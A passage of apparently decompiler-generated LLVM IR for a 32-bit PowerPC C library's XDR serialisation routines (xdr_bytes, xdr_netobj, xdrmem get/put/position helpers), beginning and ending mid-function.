  store i32 %v2_10024788, i32* @r4, align 4
  store i32 268584848, i32* @lr, align 4
  %v2_1002478c = inttoptr i32 %v0_10024784 to i32*
  %v4_1002478c = call i32 @xdr_u_int(i32* %v2_1002478c, i32* nonnull %stack_var_-40)
  store i32 %v4_1002478c, i32* %r3.global-to-local, align 4
  %v3_10024790 = icmp eq i32 %v4_1002478c, 0
  br i1 %v3_10024790, label %dec_label_pc_10024840, label %dec_label_pc_10024798

dec_label_pc_10024798:                            ; preds = %dec_label_pc_10024784
  %v3_10024798 = load i32, i32* %stack_var_-40, align 4
  %v1_1002479c = load i32, i32* %r28.global-to-local, align 4
  %v3_1002479c = icmp ugt i32 %v3_10024798, %v1_1002479c
  br i1 %v3_1002479c, label %dec_label_pc_10024840, label %dec_label_pc_100247a4

dec_label_pc_100247a4:                            ; preds = %dec_label_pc_10024798
  %v0_100247a4 = load i32, i32* @r30, align 4
  %v1_100247a4 = inttoptr i32 %v0_100247a4 to i32*
  %v2_100247a4 = load i32, i32* %v1_100247a4, align 4
  %v3_100247a8 = icmp eq i32 %v2_100247a4, 1
  br i1 %v3_100247a8, label %dec_label_pc_100247c4, label %dec_label_pc_100247b0

dec_label_pc_100247b0:                            ; preds = %dec_label_pc_100247a4
  %v1_100247b0 = icmp eq i32 %v2_100247a4, 0
  br i1 %v1_100247b0, label %dec_label_pc_1002480c, label %dec_label_pc_100247b8

dec_label_pc_100247b8:                            ; preds = %dec_label_pc_100247b0
  %v3_100247b8 = icmp eq i32 %v2_100247a4, 2
  br i1 %v3_100247b8, label %dec_label_pc_10024820, label %dec_label_pc_10024840

dec_label_pc_100247c4:                            ; preds = %dec_label_pc_100247a4
  %v1_100247c4 = add i32 %v3_10024798, 1
  store i32 %v1_100247c4, i32* @r3, align 4
  %v4_100247c4 = icmp eq i32 %v1_100247c4, 0
  br i1 %v4_100247c4, label %dec_label_pc_10024838, label %dec_label_pc_100247cc

dec_label_pc_100247cc:                            ; preds = %dec_label_pc_100247c4
  %v0_100247cc = load i32, i32* @r31, align 4
  %v3_100247cc = icmp eq i32 %v0_100247cc, 0
  br i1 %v3_100247cc, label %dec_label_pc_100247e0, label %dec_label_pc_100247e0.thread

dec_label_pc_100247e0.thread:                     ; preds = %dec_label_pc_100247cc
  br label %dec_label_pc_10024800

dec_label_pc_100247e0:                            ; preds = %dec_label_pc_100247cc
  store i32 268584920, i32* @lr, align 4
  %v0_100247d4 = call i32 @malloc()
  store i32 %v0_100247d4, i32* %r3.global-to-local, align 4
  %v1_100247d8 = load i32, i32* @r29, align 4
  %v2_100247d8 = inttoptr i32 %v1_100247d8 to i32*
  store i32 %v0_100247d4, i32* %v2_100247d8, align 4
  store i32 %v0_100247d4, i32* @r31, align 4
  %v3_100247e0 = icmp eq i32 %v0_100247d4, 0
  br i1 %v3_100247e0, label %dec_label_pc_100247e8, label %dec_label_pc_100247e0.dec_label_pc_10024800_crit_edge

dec_label_pc_100247e0.dec_label_pc_10024800_crit_edge: ; preds = %dec_label_pc_100247e0
  %v3_10024800.pre = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10024800

dec_label_pc_100247e8:                            ; preds = %dec_label_pc_100247e0
  %v3_100247f0 = load i32, i32* @global_var_1004511c, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_1002faa4.1335 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100247fc.1336 to i32), i32* @lr, align 4
  %v4_100247f8 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_1002faa4.1335 to i32), i32 %v3_100247f0, i32 268697600)
  store i32 %v4_100247f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024840

dec_label_pc_10024800:                            ; preds = %dec_label_pc_100247e0.dec_label_pc_10024800_crit_edge, %dec_label_pc_100247e0.thread
  %v3_10024800 = phi i32 [ %v3_10024798, %dec_label_pc_100247e0.thread ], [ %v3_10024800.pre, %dec_label_pc_100247e0.dec_label_pc_10024800_crit_edge ]
  %v1_1002480811 = phi i32 [ %v0_100247cc, %dec_label_pc_100247e0.thread ], [ %v0_100247d4, %dec_label_pc_100247e0.dec_label_pc_10024800_crit_edge ]
  %v4_10024808 = add i32 %v3_10024800, %v1_1002480811
  %v5_10024808 = inttoptr i32 %v4_10024808 to i8*
  store i8 0, i8* %v5_10024808, align 1
  %v3_1002480c.pre = load i32, i32* %stack_var_-40, align 4
  %v0_10024810.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1002480c

dec_label_pc_1002480c:                            ; preds = %dec_label_pc_100247b0, %dec_label_pc_10024800
  %v0_10024810 = phi i32 [ %v0_100247a4, %dec_label_pc_100247b0 ], [ %v0_10024810.pre, %dec_label_pc_10024800 ]
  %v3_1002480c = phi i32 [ %v3_10024798, %dec_label_pc_100247b0 ], [ %v3_1002480c.pre, %dec_label_pc_10024800 ]
  store i32 %v3_1002480c, i32* @r5, align 4
  store i32 %v0_10024810, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002481c.1337 to i32), i32* @lr, align 4
  %v3_10024818 = inttoptr i32 %v0_10024810 to i32*
  %v4_10024818 = call i32 @xdr_opaque(i32* %v3_10024818)
  store i32 %v4_10024818, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024844

dec_label_pc_10024820:                            ; preds = %dec_label_pc_100247b8
  %v0_10024820 = load i32, i32* @r31, align 4
  store i32 %v0_10024820, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10024828.1338 to i32), i32* @lr, align 4
  %v0_10024824 = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10024830 = load i32, i32* @r29, align 4
  %v2_10024830 = inttoptr i32 %v1_10024830 to i32*
  store i32 0, i32* %v2_10024830, align 4
  %v0_10024854.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024844

dec_label_pc_10024838:                            ; preds = %dec_label_pc_100247c4, %dec_label_pc_10024768
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024844

dec_label_pc_10024840:                            ; preds = %dec_label_pc_100247b8, %dec_label_pc_10024798, %dec_label_pc_10024784, %dec_label_pc_10024770, %dec_label_pc_100247e8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024844

dec_label_pc_10024844:                            ; preds = %dec_label_pc_10024838, %dec_label_pc_10024820, %dec_label_pc_1002480c, %dec_label_pc_10024840
  %v0_10024854 = phi i32 [ 1, %dec_label_pc_10024838 ], [ %v0_10024854.pre, %dec_label_pc_10024820 ], [ %v4_10024818, %dec_label_pc_1002480c ], [ 0, %dec_label_pc_10024840 ]
  ret i32 %v0_10024854

; uselistorder directives
  uselistorder i32 %v0_10024810, { 1, 0 }
  uselistorder i32 %v0_100247d4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_10024798, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10024784, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder label %dec_label_pc_10024844, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10024840, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1002480c, { 1, 0 }
  uselistorder label %dec_label_pc_10024784, { 1, 0 }
  uselistorder label %dec_label_pc_10024778, { 1, 0 }
}

define i32 @xdr_wrapstring() local_unnamed_addr {
entry:
  store i32 -1, i32* @r5, align 4
  store i32 268585068, i32* @lr, align 4
  %v2_10024868 = call i32 @__GI_xdr_string(i32* inttoptr (i32 -1 to i32*))
  %v2_1002486c = icmp ne i32 %v2_10024868, 0
  %v5_10024870 = zext i1 %v2_1002486c to i32
  ret i32 %v5_10024870
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1002488c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  %v1_100248ac = inttoptr i32 %arg2 to i32*
  %v2_100248ac = load i32, i32* %v1_100248ac, align 4
  store i32 %v2_100248ac, i32* @r31, align 4
  store i32 268585140, i32* @lr, align 4
  %v2_100248b0 = inttoptr i32 %arg3 to i32*
  %v4_100248b0 = call i32 @xdr_u_int(i32* %v2_100248b0, i32* %v2_100248b0)
  store i32 %v4_100248b0, i32* %r3.global-to-local, align 4
  %v3_100248b4 = icmp eq i32 %v4_100248b0, 0
  br i1 %v3_100248b4, label %dec_label_pc_10024974, label %dec_label_pc_100248bc

dec_label_pc_100248bc:                            ; preds = %entry
  %v0_100248bc = load i32, i32* @r30, align 4
  %v1_100248bc = inttoptr i32 %v0_100248bc to i32*
  %v2_100248bc = load i32, i32* %v1_100248bc, align 4
  store i32 %v2_100248bc, i32* @r30, align 4
  %v1_100248c0 = load i32, i32* %r28.global-to-local, align 4
  %v3_100248c0 = icmp ugt i32 %v2_100248bc, %v1_100248c0
  %v0_100248c8 = load i32, i32* @r29, align 4
  %v1_100248c8 = inttoptr i32 %v0_100248c8 to i32*
  br i1 %v3_100248c0, label %dec_label_pc_100248c8, label %dec_label_pc_100248d4

dec_label_pc_100248c8:                            ; preds = %dec_label_pc_100248bc
  %v2_100248c8 = load i32, i32* %v1_100248c8, align 4
  %v3_100248cc = icmp eq i32 %v2_100248c8, 2
  br i1 %v3_100248cc, label %dec_label_pc_100248d4, label %dec_label_pc_10024974

dec_label_pc_100248d4:                            ; preds = %dec_label_pc_100248bc, %dec_label_pc_100248c8
  %v2_100248d4 = load i32, i32* %v1_100248c8, align 4
  %v3_100248d8 = icmp eq i32 %v2_100248d4, 1
  br i1 %v3_100248d8, label %dec_label_pc_100248f4, label %dec_label_pc_100248e0

dec_label_pc_100248e0:                            ; preds = %dec_label_pc_100248d4
  %v1_100248e0 = icmp eq i32 %v2_100248d4, 0
  br i1 %v1_100248e0, label %dec_label_pc_100248e0.dec_label_pc_10024934_crit_edge, label %dec_label_pc_100248e8

dec_label_pc_100248e0.dec_label_pc_10024934_crit_edge: ; preds = %dec_label_pc_100248e0
  br label %dec_label_pc_10024934

dec_label_pc_100248e8:                            ; preds = %dec_label_pc_100248e0
  %v3_100248e8 = icmp eq i32 %v2_100248d4, 2
  br i1 %v3_100248e8, label %dec_label_pc_10024954, label %dec_label_pc_10024974

dec_label_pc_100248f4:                            ; preds = %dec_label_pc_100248d4
  %v3_100248f4 = icmp eq i32 %v2_100248bc, 0
  br i1 %v3_100248f4, label %dec_label_pc_1002497c, label %dec_label_pc_100248fc

dec_label_pc_100248fc:                            ; preds = %dec_label_pc_100248f4
  %v0_100248fc = load i32, i32* @r31, align 4
  %v3_100248fc = icmp eq i32 %v0_100248fc, 0
  br i1 %v3_100248fc, label %dec_label_pc_10024914, label %dec_label_pc_10024914.thread

dec_label_pc_10024914.thread:                     ; preds = %dec_label_pc_100248fc
  br label %dec_label_pc_10024934

dec_label_pc_10024914:                            ; preds = %dec_label_pc_100248fc
  store i32 %v2_100248bc, i32* @r3, align 4
  store i32 268585228, i32* @lr, align 4
  %v0_10024908 = call i32 @malloc()
  store i32 %v0_10024908, i32* %r3.global-to-local, align 4
  %v1_1002490c = load i32, i32* @r27, align 4
  %v2_1002490c = inttoptr i32 %v1_1002490c to i32*
  store i32 %v0_10024908, i32* %v2_1002490c, align 4
  %v3_10024914 = icmp eq i32 %v0_10024908, 0
  br i1 %v3_10024914, label %dec_label_pc_1002491c, label %dec_label_pc_10024914.dec_label_pc_10024914.dec_label_pc_10024934_crit_edge_crit_edge

dec_label_pc_10024914.dec_label_pc_10024914.dec_label_pc_10024934_crit_edge_crit_edge: ; preds = %dec_label_pc_10024914
  %v0_10024938.pre.pre = load i32, i32* @r29, align 4
  %v0_10024940.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10024934

dec_label_pc_1002491c:                            ; preds = %dec_label_pc_10024914
  %v3_10024924 = load i32, i32* @global_var_1004511c, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_1002fac0.1339 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10024930.1340 to i32), i32* @lr, align 4
  %v4_1002492c = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1002fac0.1339 to i32), i32 %v3_10024924, i32 268697600)
  store i32 %v4_1002492c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024974

dec_label_pc_10024934:                            ; preds = %dec_label_pc_10024914.thread, %dec_label_pc_10024914.dec_label_pc_10024914.dec_label_pc_10024934_crit_edge_crit_edge, %dec_label_pc_100248e0.dec_label_pc_10024934_crit_edge
  %v0_10024940 = phi i32 [ %v2_100248bc, %dec_label_pc_100248e0.dec_label_pc_10024934_crit_edge ], [ %v2_100248bc, %dec_label_pc_10024914.thread ], [ %v0_10024940.pre.pre, %dec_label_pc_10024914.dec_label_pc_10024914.dec_label_pc_10024934_crit_edge_crit_edge ]
  %v0_10024938 = phi i32 [ %v0_100248c8, %dec_label_pc_100248e0.dec_label_pc_10024934_crit_edge ], [ %v0_100248c8, %dec_label_pc_10024914.thread ], [ %v0_10024938.pre.pre, %dec_label_pc_10024914.dec_label_pc_10024914.dec_label_pc_10024934_crit_edge_crit_edge ]
  store i32 %v0_10024938, i32* %r3.global-to-local, align 4
  store i32 %v0_10024940, i32* @r5, align 4
  store i32 %v0_1002488c, i32* @lr, align 4
  %v3_10024950 = inttoptr i32 %v0_10024938 to i32*
  %v4_10024950 = call i32 @xdr_opaque(i32* %v3_10024950)
  store i32 %v4_10024950, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024954

dec_label_pc_10024954:                            ; preds = %dec_label_pc_100248e8, %dec_label_pc_10024934
  %v0_10024954 = load i32, i32* @r31, align 4
  %v3_10024954 = icmp eq i32 %v0_10024954, 0
  br i1 %v3_10024954, label %dec_label_pc_1002497c, label %dec_label_pc_1002495c

dec_label_pc_1002495c:                            ; preds = %dec_label_pc_10024954
  store i32 %v0_10024954, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10024964.1341 to i32), i32* @lr, align 4
  %v0_10024960 = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1002496c = load i32, i32* @r27, align 4
  %v2_1002496c = inttoptr i32 %v1_1002496c to i32*
  store i32 0, i32* %v2_1002496c, align 4
  %v0_10024990.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024980

dec_label_pc_10024974:                            ; preds = %dec_label_pc_100248e8, %dec_label_pc_100248c8, %entry, %dec_label_pc_1002491c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024980

dec_label_pc_1002497c:                            ; preds = %dec_label_pc_10024954, %dec_label_pc_100248f4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024980

dec_label_pc_10024980:                            ; preds = %dec_label_pc_10024974, %dec_label_pc_1002495c, %dec_label_pc_1002497c
  %v0_10024990 = phi i32 [ 0, %dec_label_pc_10024974 ], [ %v0_10024990.pre, %dec_label_pc_1002495c ], [ 1, %dec_label_pc_1002497c ]
  ret i32 %v0_10024990

; uselistorder directives
  uselistorder i32 %v0_10024938, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32 (i32*)* @xdr_opaque, { 1, 2, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10024980, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10024974, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10024954, { 1, 0 }
  uselistorder label %dec_label_pc_10024934, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100248d4, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1002499c = add i32 %arg1, 4
  %v4_100249a0 = inttoptr i32 %v1_1002499c to i32*
  %v5_100249a0 = call i32 @xdr_bytes(i32* %v4_100249a0, i32 %arg1, i32 1024, i32 1024)
  ret i32 %v5_100249a0
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_100249a8 = add i32 %tmp, 20
  %v3_100249a8 = inttoptr i32 %v2_100249a8 to i32*
  store i32 %arg3, i32* %v3_100249a8, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v2_100249b4 = add i32 %tmp, 4
  %v3_100249b4 = inttoptr i32 %v2_100249b4 to i32*
  store i32 ptrtoint (i32* @global_var_1002fae0.1342 to i32), i32* %v3_100249b4, align 4
  %v2_100249b8 = add i32 %tmp, 12
  %v3_100249b8 = inttoptr i32 %v2_100249b8 to i32*
  store i32 %arg2, i32* %v3_100249b8, align 4
  %v2_100249bc = add i32 %tmp, 16
  %v3_100249bc = inttoptr i32 %v2_100249bc to i32*
  store i32 %arg2, i32* %v3_100249bc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 3, 0, 2, 1, 4 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_100249c4 = load i32, i32* @r3, align 4
  ret i32 %v0_100249c4
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_100249c8 = add i32 %arg1, 20
  %v2_100249c8 = inttoptr i32 %v1_100249c8 to i32*
  %v3_100249c8 = load i32, i32* %v2_100249c8, align 4
  store i32 %v3_100249c8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_100249c8, 4
  br i1 %tmp2, label %dec_label_pc_100249fc, label %dec_label_pc_100249dc

dec_label_pc_100249dc:                            ; preds = %entry
  %v1_100249d4 = add i32 %v3_100249c8, -4
  %v1_100249dc = add i32 %arg1, 12
  %v2_100249dc = inttoptr i32 %v1_100249dc to i32*
  %v3_100249dc = load i32, i32* %v2_100249dc, align 4
  store i32 %v3_100249dc, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_100249d4, i32* %v2_100249c8, align 4
  %v0_100249e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100249e8 = inttoptr i32 %v0_100249e8 to i32*
  %v2_100249e8 = load i32, i32* %v1_100249e8, align 4
  store i32 %v2_100249e8, i32* %arg2, align 4
  %v3_100249f0 = load i32, i32* %v2_100249dc, align 4
  %v1_100249f4 = add i32 %v3_100249f0, 4
  store i32 %v1_100249f4, i32* %r9.global-to-local, align 4
  store i32 %v1_100249f4, i32* %v2_100249dc, align 4
  %v0_100249fc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100249fc

dec_label_pc_100249fc:                            ; preds = %entry, %dec_label_pc_100249dc
  %v0_100249fc = phi i32 [ 0, %entry ], [ %v0_100249fc.pre, %dec_label_pc_100249dc ]
  ret i32 %v0_100249fc

; uselistorder directives
  uselistorder i32* %v2_100249dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100249fc, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10024a04 = add i32 %arg1, 20
  %v2_10024a04 = inttoptr i32 %v1_10024a04 to i32*
  %v3_10024a04 = load i32, i32* %v2_10024a04, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10024a04, 4
  br i1 %tmp2, label %dec_label_pc_10024a38, label %dec_label_pc_10024a18

dec_label_pc_10024a18:                            ; preds = %entry
  %v1_10024a10 = add i32 %v3_10024a04, -4
  store i32 %v1_10024a10, i32* %v2_10024a04, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10024a20 = add i32 %arg1, 12
  %v2_10024a20 = inttoptr i32 %v1_10024a20 to i32*
  %v3_10024a20 = load i32, i32* %v2_10024a20, align 4
  %v2_10024a24 = load i32, i32* %arg2, align 4
  %v2_10024a28 = inttoptr i32 %v3_10024a20 to i32*
  store i32 %v2_10024a24, i32* %v2_10024a28, align 4
  %v3_10024a2c = load i32, i32* %v2_10024a20, align 4
  %v1_10024a30 = add i32 %v3_10024a2c, 4
  store i32 %v1_10024a30, i32* %v2_10024a20, align 4
  %v0_10024a38.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024a38

dec_label_pc_10024a38:                            ; preds = %entry, %dec_label_pc_10024a18
  %v0_10024a38 = phi i32 [ 0, %entry ], [ %v0_10024a38.pre, %dec_label_pc_10024a18 ]
  ret i32 %v0_10024a38

; uselistorder directives
  uselistorder i32* %v2_10024a20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024a38, { 1, 0 }
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10024a40 = add i32 %arg1, 16
  %v2_10024a40 = inttoptr i32 %v1_10024a40 to i32*
  %v3_10024a40 = load i32, i32* %v2_10024a40, align 4
  %v1_10024a44 = add i32 %arg1, 12
  %v2_10024a44 = inttoptr i32 %v1_10024a44 to i32*
  %v3_10024a44 = load i32, i32* %v2_10024a44, align 4
  %v2_10024a48 = sub i32 %v3_10024a44, %v3_10024a40
  ret i32 %v2_10024a48
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_10024a50 = add i32 %arg1, 20
  %v2_10024a50 = inttoptr i32 %v1_10024a50 to i32*
  %v3_10024a50 = load i32, i32* %v2_10024a50, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10024a58 = add i32 %arg1, 12
  %v2_10024a58 = inttoptr i32 %v1_10024a58 to i32*
  %v3_10024a58 = load i32, i32* %v2_10024a58, align 4
  %v1_10024a5c = add i32 %arg1, 16
  %v2_10024a5c = inttoptr i32 %v1_10024a5c to i32*
  %v3_10024a5c = load i32, i32* %v2_10024a5c, align 4
  %v2_10024a60 = add i32 %v3_10024a58, %v3_10024a50
  %v2_10024a64 = add i32 %v3_10024a5c, %arg2
  store i32 %v2_10024a64, i32* %r4.global-to-local, align 4
  %v3_10024a68 = icmp slt i32 %v2_10024a60, %v2_10024a64
  br i1 %v3_10024a68, label %dec_label_pc_10024a80, label %dec_label_pc_10024a74

dec_label_pc_10024a74:                            ; preds = %entry
  %v2_10024a6c = sub i32 %v2_10024a60, %v2_10024a64
  store i32 %v2_10024a6c, i32* %v2_10024a50, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v0_10024a7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10024a7c, i32* %v2_10024a58, align 4
  %v0_10024a80.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10024a80

dec_label_pc_10024a80:                            ; preds = %entry, %dec_label_pc_10024a74
  %v0_10024a80 = phi i32 [ 0, %entry ], [ %v0_10024a80.pre, %dec_label_pc_10024a74 ]
  ret i32 %v0_10024a80

; uselistorder directives
  uselistorder i32 %v2_10024a64, { 1, 0, 2 }
  uselistorder i32 %v2_10024a60, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024a80, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v1_10024a88 = add i32 %arg1, 20
  %v2_10024a88 = inttoptr i32 %v1_10024a88 to i32*
  %v3_10024a88 = load i32, i32* %v2_10024a88, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10024a90 = icmp ult i32 %v3_10024a88, %arg2
  br i1 %v2_10024a90, label %dec_label_pc_10024aac, label %dec_label_pc_10024a9c

dec_label_pc_10024a9c:                            ; preds = %entry
  %v2_10024a94 = sub i32 %v3_10024a88, %arg2
  %v1_10024a9c = add i32 %arg1, 12
  %v2_10024a9c = inttoptr i32 %v1_10024a9c to i32*
  %v3_10024a9c = load i32, i32* %v2_10024a9c, align 4
  store i32 %v3_10024a9c, i32* %r9.global-to-local, align 4
  store i32 %v2_10024a94, i32* %v2_10024a88, align 4
  %v0_10024aa4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10024aa4 = add i32 %v0_10024aa4, %arg2
  store i32 %v2_10024aa4, i32* %v2_10024a9c, align 4
  %v0_10024aac.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10024aac

dec_label_pc_10024aac:                            ; preds = %entry, %dec_label_pc_10024a9c
  %v0_10024aac = phi i32 [ 0, %entry ], [ %v0_10024aac.pre, %dec_label_pc_10024a9c ]
  ret i32 %v0_10024aac

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10024aac, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10024ab4 = add i32 %arg1, 20
  %v2_10024ab4 = inttoptr i32 %v1_10024ab4 to i32*
  %v3_10024ab4 = load i32, i32* %v2_10024ab4, align 4
  store i32 %v3_10024ab4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10024ab4, 4
  br i1 %tmp2, label %dec_label_pc_10024ae8, label %dec_label_pc_10024ac8

dec_label_pc_10024ac8:                            ; preds = %entry
  %v1_10024ac0 = add i32 %v3_10024ab4, -4
  %v1_10024ac8 = add i32 %arg1, 12
  %v2_10024ac8 = inttoptr i32 %v1_10024ac8 to i32*
  %v3_10024ac8 = load i32, i32* %v2_10024ac8, align 4
  store i32 %v3_10024ac8, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_10024ac0, i32* %v2_10024ab4, align 4
  %v0_10024ad4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10024ad4 = inttoptr i32 %v0_10024ad4 to i32*
  %v2_10024ad4 = load i32, i32* %v1_10024ad4, align 4
  store i32 %v2_10024ad4, i32* %arg2, align 4
  %v3_10024adc = load i32, i32* %v2_10024ac8, align 4
  %v1_10024ae0 = add i32 %v3_10024adc, 4
  store i32 %v1_10024ae0, i32* %r9.global-to-local, align 4
  store i32 %v1_10024ae0, i32* %v2_10024ac8, align 4
  %v0_10024ae8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024ae8

dec_label_pc_10024ae8:                            ; preds = %entry, %dec_label_pc_10024ac8
  %v0_10024ae8 = phi i32 [ 0, %entry ], [ %v0_10024ae8.pre, %dec_label_pc_10024ac8 ]
  ret i32 %v0_10024ae8

; uselistorder directives
  uselistorder i32* %v2_10024ac8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024ae8, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10024af0 = add i32 %arg1, 20
  %v2_10024af0 = inttoptr i32 %v1_10024af0 to i32*
  %v3_10024af0 = load i32, i32* %v2_10024af0, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10024af0, 4
  br i1 %tmp2, label %dec_label_pc_10024b24, label %dec_label_pc_10024b04

dec_label_pc_10024b04:                            ; preds = %entry
  %v1_10024afc = add i32 %v3_10024af0, -4
  store i32 %v1_10024afc, i32* %v2_10024af0, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10024b0c = add i32 %arg1, 12
  %v2_10024b0c = inttoptr i32 %v1_10024b0c to i32*
  %v3_10024b0c = load i32, i32* %v2_10024b0c, align 4
  %v2_10024b10 = load i32, i32* %arg2, align 4
  %v2_10024b14 = inttoptr i32 %v3_10024b0c to i32*
  store i32 %v2_10024b10, i32* %v2_10024b14, align 4
  %v3_10024b18 = load i32, i32* %v2_10024b0c, align 4
  %v1_10024b1c = add i32 %v3_10024b18, 4
  store i32 %v1_10024b1c, i32* %v2_10024b0c, align 4
  %v0_10024b24.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024b24

dec_label_pc_10024b24:                            ; preds = %entry, %dec_label_pc_10024b04
  %v0_10024b24 = phi i32 [ 0, %entry ], [ %v0_10024b24.pre, %dec_label_pc_10024b04 ]
  ret i32 %v0_10024b24

; uselistorder directives
  uselistorder i32* %v2_10024b0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024b24, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* %r30.global-to-local, align 4
